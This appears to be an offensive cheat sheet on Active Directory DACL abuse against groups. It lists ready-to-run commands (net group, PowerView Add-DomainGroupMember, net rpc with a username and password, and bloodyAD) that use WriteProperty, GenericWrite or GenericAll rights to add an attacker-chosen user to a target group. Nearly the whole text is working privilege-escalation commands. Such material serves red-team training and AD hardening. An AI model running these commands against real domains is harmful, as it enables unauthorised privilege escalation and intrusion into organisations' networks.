# DACL Attacks on a group

## 1) WriteProperty/AllExtendedRights/GenericWrite Self/Generic ALL

With one of these rights, we can add a new member to the group

    net group TARGET_GROUP user1 /add

### PowerView

    Add-DomainGroupMember -Identity 'TARGET_GROUP' -Members 'user1'

### Linux

    net rpc group addmem GROUP user2 -U domain.local/user1%password -S DC_IP

### BloodyAD

    bloodyAD --host "DC_IP" -d "domain.local" -u "user2" -p "Password@1" add groupMember "GROUP" "user2"

### Windows Net command

    net group "GROUP" user2 /add /domain
